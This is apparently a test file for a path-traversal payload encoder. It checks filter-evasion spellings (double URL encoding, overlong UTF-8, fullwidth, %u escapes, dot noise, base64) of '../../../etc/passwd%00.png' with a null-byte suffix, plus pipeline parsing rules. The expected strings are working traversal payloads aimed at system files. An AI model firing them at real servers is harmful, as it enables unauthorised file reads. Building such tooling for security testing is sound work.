import { describe, expect, test } from "bun:test"
import {
  base64Text,
  parsePipeline,
  PipelineError,
  primaryClass,
  STRATEGY_CATALOG,
  subsumes,
  tokenize
} from "../src/core/index.ts"
import { applyPipeline, fixture, protectedSeg, seg } from "./support.ts"

// The fixture joins plain to `../../../etc/passwd%00.png`, with `%00.png` on a
// slot that declares `transform: false`.
const EXPECTED: ReadonlyArray<readonly [string, string]> = [
  ["plain", "../../../etc/passwd%00.png"],
  ["url_encode:1", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.png"],
  [
    "url_encode:1 > hex_case_upper",
    "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00.png"
  ],
  [
    "url_encode:1 > hex_case_lower",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.png"
  ],
  [
    "url_encode:2",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00.png"
  ],
  ["overlong_utf8", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%00.png"],
  [
    "overlong_utf8(+dots)",
    "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd%00.png"
  ],
  [
    "fullwidth",
    "%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd%00.png"
  ],
  ["utf16_escape", "..%u2215..%u2215..%u2215etc%u2215passwd%00.png"],
  [
    'utf16_escape(codepoint="2044")',
    "..%u2044..%u2044..%u2044etc%u2044passwd%00.png"
  ],
  ["double_percent", "..%%32%66..%%32%66..%%32%66etc%%32%66passwd%00.png"],
  ["dot_noise", ".././.././.././etc/./passwd%00.png"],
  ["double_slash", "..//..//..//etc//passwd%00.png"],
  ["backtrack", "../zz/../../zz/../../zz/../etc/zz/../passwd%00.png"],
  ["matrix_param", "..;a=b/..;a=b/..;a=b/etc;a=b/passwd%00.png"],
  ["selective_first", "..%2f../../etc/passwd%00.png"],
  ["selective_last", "../../../etc%2fpasswd%00.png"],
  ["selective_alternating", "..%2f../..%2fetc/passwd%00.png"],
  ["path_case_upper", "../../../ETC/PASSWD%00.png"],
  ["padding:2", "././../../../etc/passwd%00.png"],
  ["trailing_dot", "../../../etc/passwd.%00.png"],
  ["trailing_space", "../../../etc/passwd %00.png"],
  ["base64", "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==%00.png"]
]

describe("every strategy produces its expected spelling", () => {
  for (const [pipeline, expected] of EXPECTED) {
    test(pipeline, () => {
      expect(applyPipeline(pipeline)).toBe(expected)
    })
  }
})

/**
 * The two newest members of the `overlong_utf8` / `fullwidth` family: separator
 * respellings a filter that only knows `%XY` has no rule for at all.
 */
describe("utf16_escape and double_percent", () => {
  test("utf16_escape spells '/' as a LOOKALIKE codepoint and '\\' as itself", () => {
    expect(applyPipeline("utf16_escape", [seg("../../../etc/passwd", "target")]))
      .toBe("..%u2215..%u2215..%u2215etc%u2215passwd")
    expect(applyPipeline("utf16_escape", [seg("..\\..\\boot.ini", "target")]))
      .toBe("..%u005c..%u005cboot.ini")
  })

  test("the codepoint argument is an alternate spelling of the SAME hypothesis", () => {
    // U+2044 FRACTION SLASH rather than U+2215 DIVISION SLASH, which is why it is
    // an argument and not a second catalog entry -- and why it names the stage.
    expect(parsePipeline('utf16_escape(codepoint="2044")', "./\\").label).toBe(
      'utf16_escape(codepoint="2044")'
    )
    expect(parsePipeline("utf16_escape", "./\\").label).toBe("utf16_escape")
    expect(parsePipeline('utf16_escape(codepoint="2215")', "./\\").label).toBe(
      "utf16_escape"
    )
  })

  test("a codepoint that is not four hex digits is a config error", () => {
    expect(() => parsePipeline('utf16_escape(codepoint="2044 ")', "./\\")).toThrow(
      /four hex digits/
    )
    expect(() => parsePipeline('utf16_escape(codepoint="zzzz")', "./\\")).toThrow(
      PipelineError
    )
    expect(() => parsePipeline("utf16_escape(codepoint)", "./\\")).toThrow(
      /needs a value/
    )
    expect(() => parsePipeline('utf16_escape(cp="2044")', "./\\")).toThrow(
      /unknown argument 'cp'/
    )
  })

  test("double_percent encodes the HEX DIGITS, so no '%25' reaches the wire", () => {
    const payload = applyPipeline("double_percent", [
      seg("../../../etc/passwd", "target")
    ])
    expect(payload).toBe("..%%32%66..%%32%66..%%32%66etc%%32%66passwd")
    expect(payload).not.toContain("%25")
    // One decode leaves the literal text '%2f'; a second leaves '/'.
    expect(payload.replace(/%(3[0-9]|6[0-9a-f])/g, (_, hex: string) =>
      String.fromCharCode(parseInt(hex, 16))
    )).toBe("..%2f..%2f..%2fetc%2fpasswd")
    expect(applyPipeline("double_percent", [seg("..\\..\\boot.ini", "target")]))
      .toBe("..%%35%63..%%35%63boot.ini")
  })

  test("both are separator-only: a protected segment is untouched", () => {
    expect(applyPipeline("utf16_escape")).toBe(
      "..%u2215..%u2215..%u2215etc%u2215passwd%00.png"
    )
    expect(applyPipeline("double_percent")).toBe(
      "..%%32%66..%%32%66..%%32%66etc%%32%66passwd%00.png"
    )
  })

  test("the corpus classifier already names both techniques", () => {
    // 'percent-u' and 'nested-percent' are primary classes in payloads.ts, which
    // is where the 36 raw-full.txt entries that need these stages were counted.
    expect(primaryClass(applyPipeline("utf16_escape"))).toBe("percent-u")
    expect(primaryClass(applyPipeline("double_percent"))).toBe("nested-percent")
  })
})

describe("selective_* is payload-positional, not per-segment", () => {
  // The bug: applied per segment, `first` fires once inside EVERY segment and
  // produces `..%2f../../etc%2fpasswd` -- two encodings instead of one.
  test("selective_first encodes exactly ONE separator across the whole payload", () => {
    const payload = applyPipeline("selective_first")
    expect(payload).toBe("..%2f../../etc/passwd%00.png")
    expect(payload.match(/%2f/g)).toHaveLength(1)
  })

  test("selective_last encodes exactly ONE separator, in the last segment", () => {
    const payload = applyPipeline("selective_last")
    expect(payload).toBe("../../../etc%2fpasswd%00.png")
    expect(payload.match(/%2f/g)).toHaveLength(1)
  })

  test("the index spans segments: with a prefix, 'first' still fires once", () => {
    const payload = applyPipeline(
      "selective_first",
      fixture({ prefix: seg("/var/www/html/", "prefix") })
    )
    expect(payload).toBe("%2fvar/www/html/../../../etc/passwd%00.png")
    expect(payload.match(/%2f/g)).toHaveLength(1)
  })

  test("alternating picks every other separator across the payload, not per segment", () => {
    // 4 separators: traversal 3, target 1. Indexes 0 and 2 are chosen.
    expect(applyPipeline("selective_alternating")).toBe(
      "..%2f../..%2fetc/passwd%00.png"
    )
  })

  test("a protected segment neither gets encoded nor shifts the numbering", () => {
    // The protected suffix holds a separator; `last` must still land on the
    // target's separator, which is the last *transformable* one.
    expect(
      applyPipeline("selective_last", fixture({ suffix: protectedSeg("/x.png") }))
    ).toBe("../../../etc%2fpasswd/x.png")
  })
})

// §4: charset is semantically per STAGE, and `url_encode:1 > base64 >
// url_encode:1` wants a different one on each end.
describe("inline stage arguments", () => {
  const blob = base64Text("../../../etc/passwd")

  test("the blob has padding but no slash, so the default charset is a no-op", () => {
    expect(blob).toBe("Li4vLi4vLi4vZXRjL3Bhc3N3ZA==")
    expect(applyPipeline("base64 > url_encode:1")).toBe(applyPipeline("base64"))
  })

  test("a per-stage charset escapes the blob without a per-pipeline setting", () => {
    expect(applyPipeline('base64 > url_encode:1(charset="+/=")')).toBe(
      "Li4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d%00.png"
    )
  })

  test("two url_encode stages with DIFFERENT charsets -- v1 could not say this", () => {
    // './\\' on the first so the whole path is escaped, '+/=' on the second so
    // the base64 of that escaped text survives transit. One pipeline-wide charset
    // cannot be both, which is the gap §4 names.
    const perStage = applyPipeline(
      'url_encode:1(charset="./\\\\") > base64 > url_encode:1(charset="+/=")',
      [seg("../../../etc/passwd", "target")]
    )
    const oneCharset = applyPipeline(
      "url_encode:1 > base64 > url_encode:1",
      [seg("../../../etc/passwd", "target")],
      "+/="
    )
    expect(perStage).not.toBe(oneCharset)
    expect(atob(perStage)).toBe("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
    expect(atob(oneCharset.replaceAll("%2f", "/").replaceAll("%2b", "+")))
      .toBe("..%2f..%2f..%2fetc%2fpasswd")
  })

  test("an unquoted value works for a charset with no comma or bracket", () => {
    expect(applyPipeline("url_encode:1(charset=.)")).toBe(
      "%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.png"
    )
  })

  test("the pipeline charset is the fallback for a stage that sets none", () => {
    // '+/=' contains '/' but not '.', so only the separators are escaped.
    expect(applyPipeline("url_encode:1", fixture(), "+/=")).toBe(
      "..%2f..%2f..%2fetc%2fpasswd%00.png"
    )
  })

  test("tokenize splits name, intensity and arguments", () => {
    expect(tokenize('url_encode:1(charset="+/=")')).toEqual({
      raw: 'url_encode:1(charset="+/=")',
      name: "url_encode",
      intensity: "1",
      args: [{ key: "charset", value: "+/=" }]
    })
    expect(tokenize("overlong_utf8(+dots)")).toEqual({
      raw: "overlong_utf8(+dots)",
      name: "overlong_utf8",
      intensity: undefined,
      args: [{ key: "dots", value: undefined }]
    })
    expect(tokenize("plain_name")).toEqual({
      raw: "plain_name",
      name: "plain_name",
      intensity: undefined,
      args: []
    })
  })

  test("a bad argument list is named", () => {
    const expectError = (pipeline: string, match: RegExp) => {
      expect(() => parsePipeline(pipeline, "./\\")).toThrow(match)
    }
    expectError("url_encode:1(charset)", /argument 'charset' needs a value/)
    expectError('url_encode:1(charset="x"', /unterminated argument list/)
    expectError('url_encode:1(charset="x)', /unterminated quoted value/)
    expectError("url_encode:1(nonsense=1)", /unknown argument 'nonsense'/)
    expectError("base64(charset=x)", /unknown argument 'charset'/)
    expectError("overlong_utf8(dots=yes)", /'dots' is a flag/)
    expectError('url_encode:1(charset="x" charset="y")', /expected ',' between arguments/)
  })
})

// §4: stage SIGNATURES replace the one bespoke `producesEscapes` check.
describe("stage signatures validate any ordering constraint", () => {
  const expectError = (pipeline: string, match: RegExp) => {
    let thrown: unknown
    try {
      parsePipeline(pipeline, "./\\")
    } catch (error) {
      thrown = error
    }
    expect(thrown).toBeInstanceOf(PipelineError)
    expect((thrown as PipelineError).message).toMatch(match)
  }

  test("the subsumption lattice: everything is a 'text', nothing else subsumes", () => {
    expect(subsumes("text", "opaque")).toBe(true)
    expect(subsumes("text", "path")).toBe(true)
    expect(subsumes("path", "path")).toBe(true)
    expect(subsumes("path", "opaque")).toBe(false)
    expect(subsumes("escapes", "path")).toBe(false)
  })

  test("hex_case needs escapes, which is v1's one bespoke rule, now derived", () => {
    expectError("hex_case_upper", /needs 'escapes'/)
    expectError("hex_case_upper", /the assembled payload produced 'path'/)
    expectError("dot_noise > hex_case_upper", /'dot_noise' produced 'path'/)
  })

  test("base64 > dot_noise is REJECTED: '/./' in a blob is meaningless", () => {
    // v1 parsed and ran this happily, inserting '/./' into a base64 payload.
    expectError("base64 > dot_noise", /'dot_noise' needs 'path'/)
    expectError("base64 > dot_noise", /'base64' produced 'opaque'/)
  })

  test("every other stage that needs a real path is rejected after base64", () => {
    for (
      const stage of [
        "dot_noise",
        "double_slash",
        "backtrack",
        "matrix_param",
        "overlong_utf8",
        "fullwidth",
        "utf16_escape",
        'utf16_escape(codepoint="2044")',
        "double_percent",
        "path_case_upper",
        "selective_first",
        "selective_last",
        "selective_alternating"
      ]
    ) {
      expectError(`base64 > ${stage}`, /needs 'path'/)
    }
  })

  test("base64 > url_encode:1 is ALLOWED, because 'opaque' is a 'text'", () => {
    expect(parsePipeline("base64 > url_encode:1", "+/=").stages).toHaveLength(2)
  })

  test("the pipeline reports the kind it leaves the payload in", () => {
    expect(parsePipeline("plain", "./\\").produces).toBe("path")
    expect(parsePipeline("dot_noise", "./\\").produces).toBe("path")
    expect(parsePipeline("url_encode:1", "./\\").produces).toBe("escapes")
    expect(parsePipeline("base64", "./\\").produces).toBe("opaque")
    // padding and trailing_* preserve whatever came in.
    expect(parsePipeline("base64 > padding:2", "./\\").produces).toBe("opaque")
    expect(parsePipeline("url_encode:1 > trailing_dot", "./\\").produces).toBe("escapes")
  })

  test("hex_case is accepted after any escape-producing stage", () => {
    for (
      const stage of [
        "url_encode:1",
        "url_encode:3",
        "overlong_utf8",
        "fullwidth",
        "selective_first"
      ]
    ) {
      expect(parsePipeline(`${stage} > hex_case_upper`, "./\\").stages).toHaveLength(2)
    }
  })
})

// §5: ':' means intensity, always.
describe("renamed strategies produce a migration error", () => {
  const expectError = (pipeline: string, match: RegExp) => {
    expect(() => parsePipeline(pipeline, "./\\")).toThrow(match)
  }

  test("each old name says what it became", () => {
    const pairs: ReadonlyArray<readonly [string, string]> = [
      ["noise:dot", "dot_noise"],
      ["noise:double_slash", "double_slash"],
      ["noise:backtrack", "backtrack"],
      ["noise:matrix_param", "matrix_param"],
      ["selective:first", "selective_first"],
      ["selective:last", "selective_last"],
      ["selective:alternating", "selective_alternating"],
      ["hex_case:upper", "hex_case_upper"],
      ["hex_case:lower", "hex_case_lower"],
      ["path_case:upper", "path_case_upper"]
    ]
    for (const [before, after] of pairs) {
      expectError(before, new RegExp(`'${before}' was renamed to '${after}'`))
      expectError(before, /':' now means INTENSITY only/)
    }
  })

  test("a bare family name names every replacement", () => {
    expectError("noise", /dot_noise, double_slash, backtrack or matrix_param/)
    expectError("selective", /selective_first, selective_last or selective_alternating/)
    expectError("hex_case", /hex_case_upper or hex_case_lower/)
  })

  test("the names that ARE intensities are untouched", () => {
    for (const pipeline of ["url_encode:1", "url_encode:2", "url_encode:3", "padding:8"]) {
      expect(parsePipeline(pipeline, "./\\").stages).toHaveLength(1)
    }
  })
})

describe("transform: false holds under every strategy", () => {
  const SUFFIX = "%00.png"
  for (const [pipeline] of EXPECTED) {
    test(`${pipeline} leaves the protected suffix literal`, () => {
      expect(applyPipeline(pipeline).endsWith(SUFFIX)).toBe(true)
    })
  }

  test("and under compositions", () => {
    for (
      const pipeline of [
        "dot_noise > url_encode:1",
        "overlong_utf8 > hex_case_upper",
        "padding:3 > selective_first",
        "trailing_dot > base64",
        "fullwidth > url_encode:1 > hex_case_upper"
      ]
    ) {
      expect(applyPipeline(pipeline).endsWith(SUFFIX)).toBe(true)
    }
  })

  test("a protected anchor segment is not even extended by trailing_dot", () => {
    expect(
      applyPipeline(
        "trailing_dot",
        fixture({ target: protectedSeg("/etc/passwd", "target") })
      )
    ).toBe("../../../etc/passwd%00.png")
  })

  test("a fully protected payload survives every REWRITING strategy untouched", () => {
    const frozen = [protectedSeg("../../../etc/passwd", "target")]
    for (const [pipeline] of EXPECTED) {
      // `padding:N` is the one exception, and it is not a rewrite: it prepends
      // new synthetic material without touching the protected bytes.
      if (pipeline.startsWith("padding")) continue
      expect(applyPipeline(pipeline, frozen)).toBe("../../../etc/passwd")
    }
  })

  test("padding adds material in front without altering the protected bytes", () => {
    const frozen = [protectedSeg("../../../etc/passwd", "target")]
    expect(applyPipeline("padding:2", frozen)).toBe("././../../../etc/passwd")
  })
})

// §3: the anchor slot is derived from the slot list, not a hard-coded role.
describe("trailing_* lands on the anchor slot", () => {
  test("the dot goes on the target, never after the suffix", () => {
    expect(applyPipeline("trailing_dot")).toBe("../../../etc/passwd.%00.png")
  })

  test("with no anchor slot named, it falls back to the last rewritable segment", () => {
    const segments = [seg("../../../etc/passwd", "target")]
    expect(applyPipeline("trailing_dot", segments)).toBe("../../../etc/passwd.")
  })
})

describe("pipeline parsing fails loudly", () => {
  const expectError = (pipeline: string, match: RegExp) => {
    let thrown: unknown
    try {
      parsePipeline(pipeline, "./\\")
    } catch (error) {
      thrown = error
    }
    expect(thrown).toBeInstanceOf(PipelineError)
    expect((thrown as PipelineError).message).toMatch(match)
  }

  test("an unknown strategy name lists the valid set with its signature", () => {
    expectError("url_encoded:1", /unknown strategy 'url_encoded'/)
    expectError("url_encoded:1", /url_encode:N/)
    expectError("url_encoded:1", /text -> escapes/)
    expectError("url_encoded:1", /dot_noise/)
  })

  test("a bad or missing intensity is named", () => {
    expectError("url_encode", /needs a positive integer intensity/)
    expectError("url_encode:0", /needs a positive integer intensity/)
    expectError("url_encode:two", /needs a positive integer intensity/)
    expectError("padding:-1", /needs a positive integer intensity/)
  })

  test("an intensity where none is allowed is rejected", () => {
    expectError("base64:1", /takes no ':' intensity/)
    expectError("fullwidth:1", /takes no ':' intensity/)
    expectError("overlong_utf8:dots", /takes no ':' intensity/)
    expectError("dot_noise:1", /takes no ':' intensity/)
  })

  test("an argument where none is allowed is rejected", () => {
    expectError("base64(+dots)", /unknown argument 'dots'/)
    expectError("dot_noise(x=1)", /unknown argument 'x'/)
  })

  test("an empty pipeline is rejected", () => {
    expectError("", /empty pipeline/)
    expectError("  >  ", /empty pipeline/)
  })

  test("a stage that is not a name at all is rejected", () => {
    expectError("(nope)", /is not a valid strategy stage/)
    expectError("url_encode:1)", /needs a positive integer intensity/)
    expectError("dot_noise extra", /is not a valid strategy stage/)
  })
})

describe("pipeline canonicalisation", () => {
  test("the label is the normalised stage sequence", () => {
    expect(parsePipeline("url_encode:1>hex_case_upper", "./\\").label).toBe(
      "url_encode:1 > hex_case_upper"
    )
    expect(parsePipeline("  plain  ", "./\\").label).toBe("plain")
  })

  test("a charset that differs from the default IS part of the label", () => {
    // Two `url_encode:1` entries escaping different characters are two different
    // hypotheses; a report that printed both as `url_encode:1` would be lying.
    expect(parsePipeline('url_encode:1(charset="+/=")', "./\\").label).toBe(
      'url_encode:1(charset="+/=")'
    )
  })

  test("a charset equal to the default is left out of the label", () => {
    expect(parsePipeline('url_encode:1(charset="./\\\\")', "./\\").label).toBe(
      "url_encode:1"
    )
    expect(parsePipeline("url_encode:1", "+/=").label).toBe("url_encode:1")
  })

  test("plain contributes no stages", () => {
    expect(parsePipeline("plain", "./\\").stages).toHaveLength(0)
    expect(parsePipeline("plain > url_encode:1", "./\\").stages).toHaveLength(1)
  })

  test("the catalog documents a hypothesis and a signature for every entry", () => {
    expect(STRATEGY_CATALOG.length).toBeGreaterThan(15)
    for (const entry of STRATEGY_CATALOG) {
      expect(entry.usage.length).toBeGreaterThan(0)
      expect(entry.hypothesis.length).toBeGreaterThan(0)
      expect(entry.signature).toMatch(/->/)
    }
  })
})
